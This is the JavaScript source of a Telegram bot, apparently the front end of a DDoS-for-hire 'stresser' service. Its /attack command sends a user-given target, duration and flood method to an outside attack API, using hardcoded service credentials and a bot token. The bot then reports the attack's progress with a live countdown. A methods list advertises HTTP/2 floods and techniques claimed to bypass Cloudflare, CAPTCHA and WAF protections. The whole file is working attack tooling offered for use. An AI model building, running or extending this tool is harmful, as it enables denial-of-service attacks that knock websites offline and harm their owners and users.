const TelegramBot = require('node-telegram-bot-api');
const axios = require('axios');

// ========== CONFIG ========== //
const BOT_TOKEN = "8074837888:AAEhzB1Rs2i-acPAIWYS2yl9OSm2fN3q9Xo";
const API_USER = "Kolzs";
const API_KEY = "BHUBacNx";
const API_URL = "https://goliathstress.su/v1/attack";

// Track active attacks
const activeAttacks = new Map();

// Create bot
const bot = new TelegramBot(BOT_TOKEN, { polling: true });

// ========== /start ========== //
bot.onText(/\/start/, (msg) => {
    const chatId = msg.chat.id;
    bot.sendMessage(
        chatId,
        "Welcome to NRST STRESSER BOT 💥\n\n" +
        "🛠 Use /attack <target> <time> <method> to launch.\n" +
        "Example:\n" +
        "`/attack https://example.com 120 PRIV-FLOOD`\n\n" +
        "📖 Use /methods to see available L7 methods.\n" +
        "ℹ️ Use /help to see all commands.",
        { parse_mode: "Markdown" }
    );
});

// ========== /help ========== //
bot.onText(/\/help/, (msg) => {
    const chatId = msg.chat.id;
    bot.sendMessage(
        chatId,
        "📜 *Available Commands:*\n\n" +
        "🔹 /start - Start the bot\n" +
        "🔹 /help - Show this help message\n" +
        "🔹 /attack <target> <time> <method> - Launch an attack\n" +
        "🔹 /methods - Show available L7 methods\n\n" +
        "Example attack:\n" +
        "`/attack https://example.com 120 PRIV-FLOOD`",
        { parse_mode: "Markdown" }
    );
});

// ========== /attack ========== //
bot.onText(/\/attack (.+)/, async (msg, match) => {
    const chatId = msg.chat.id;
    const userId = msg.from.id;
    
    // Check if user already has an active attack
    if (activeAttacks.has(userId)) {
        const remainingTime = activeAttacks.get(userId).endTime - Math.floor(Date.now() / 1000);
        if (remainingTime > 0) {
            return bot.sendMessage(
                chatId,
                `❌ You already have an active attack running!\n⏳ Please wait ${remainingTime} seconds before starting a new one.`,
                { parse_mode: "Markdown" }
            );
        } else {
            activeAttacks.delete(userId);
        }
    }

    const args = match[1].split(' ');
    if (args.length < 3) {
        return bot.sendMessage(chatId, "❌ Usage: /attack <target> <time> <method>");
    }

    const target = args[0];
    const time = parseInt(args[1]);
    const method = args[2].toUpperCase();

    if (isNaN(time) || time <= 0) {
        return bot.sendMessage(chatId, "⛔️ Time must be a positive number (in seconds).");
    }

    const port = 443;
    const concurrents = 1;
    const subnet = 32;
    const rate = 128;
    const geo = "proxies.txt";

    const params = {
        username: API_USER,
        key: API_KEY,
        target: target,
        time: time,
        port: port,
        method: method,
        concurrents: concurrents,
        subnet: subnet,
        rate: rate,
        geo: geo
    };

    try {
        const response = await axios.get(API_URL, { params });
        const data = response.data;

        if (data.Status === "true") {
            const attackInfo = data.Attacks || {};
            const attackId = data.ID;
            
            // Record the attack end time
            const endTime = Math.floor(Date.now() / 1000) + time;
            activeAttacks.set(userId, { endTime });

            let messageText = (
                `🚀 *Attack Started!*\n` +
                `🆔 *ID:* \`${attackId}\`\n` +
                `🌐 *Target:* \`${attackInfo.target}\`\n` +
                `🔧 *Method:* \`${attackInfo.method}\`\n` +
                `📍 *Geo:* \`${attackInfo.geo}\`\n` +
                `🎯 *Port:* \`${attackInfo.port}\`\n` +
                `⚡️ *Rate:* \`${attackInfo.rate}\`\n` +
                `⏱️ *Time left:* \`${time}s\`\n\n` +
                `✅ *Status:* _Running_`
            );

            const sentMsg = await bot.sendMessage(chatId, messageText, { parse_mode: "Markdown" });

            // Countdown loop
            let remaining = time;
            const countdownInterval = setInterval(async () => {
                remaining--;
                
                if (remaining <= 0) {
                    clearInterval(countdownInterval);
                    activeAttacks.delete(userId);
                    
                    await bot.editMessageText(
                        `🚨 *Attack Ended!*\n` +
                        `🆔 *ID:* \`${attackId}\`\n` +
                        `🌐 *Target:* \`${attackInfo.target}\`\n` +
                        `⏱️ *Duration:* \`${time}s\`\n` +
                        `🔧 *Method:* \`${attackInfo.method}\`\n` +
                        `✅ *Status:* _Completed_`,
                        {
                            chat_id: chatId,
                            message_id: sentMsg.message_id,
                            parse_mode: "Markdown"
                        }
                    );
                } else {
                    messageText = (
                        `🚀 *Attack Started!*\n` +
                        `🆔 *ID:* \`${attackId}\`\n` +
                        `🌐 *Target:* \`${attackInfo.target}\`\n` +
                        `🔧 *Method:* \`${attackInfo.method}\`\n` +
                        `📍 *Geo:* \`${attackInfo.geo}\`\n` +
                        `🎯 *Port:* \`${attackInfo.port}\`\n` +
                        `⚡️ *Rate:* \`${attackInfo.rate}\`\n` +
                        `⏱️ *Time left:* \`${remaining}s\`\n\n` +
                        `✅ *Status:* _Running_`
                    );
                    
                    try {
                        await bot.editMessageText(messageText, {
                            chat_id: chatId,
                            message_id: sentMsg.message_id,
                            parse_mode: "Markdown"
                        });
                    } catch (error) {
                        console.log("Error updating message:", error.message);
                        clearInterval(countdownInterval);
                    }
                }
            }, 1000);

        } else {
            bot.sendMessage(chatId, "❌ Failed to start attack.");
        }
    } catch (error) {
        console.error("Error:", error);
        bot.sendMessage(chatId, `⚠️ Error: ${error.message}`, { parse_mode: "Markdown" });
    }
});

// ========== /methods | /l7 | /L7 ========== //
const methodsText = (
    "📡 *Layer 7 Attack Methods:*\n\n" +
    "🔹 *PRIV-FLOOD* — HTTP/2 powerful flooder for HTTPS targets\n" +
    "🔹 *BROWSER* — Bypasses Cloudflare Turnstile, Recaptcha, Amazon WAF, hCaptcha, DDoS-Guard, React JS\n" +
    "🔹 *HTTP* — HTTP/1.1 flood for sites without HTTP/2 support\n" +
    "🔹 *CLOUDFLARE* — HTTP/2 flood to bypass Cloudflare DDOS protection\n" +
    "🔹 *HTTPSBYPASS* — HTTP/2 flooder for non-Cloudflare large backend sites\n"
);

bot.onText(/\/methods/, (msg) => {
    bot.sendMessage(msg.chat.id, methodsText, { parse_mode: "Markdown" });
});

bot.onText(/\/l7/i, (msg) => {
    bot.sendMessage(msg.chat.id, methodsText, { parse_mode: "Markdown" });
});

console.log("✅ NRST STRESSER BOT is running...");
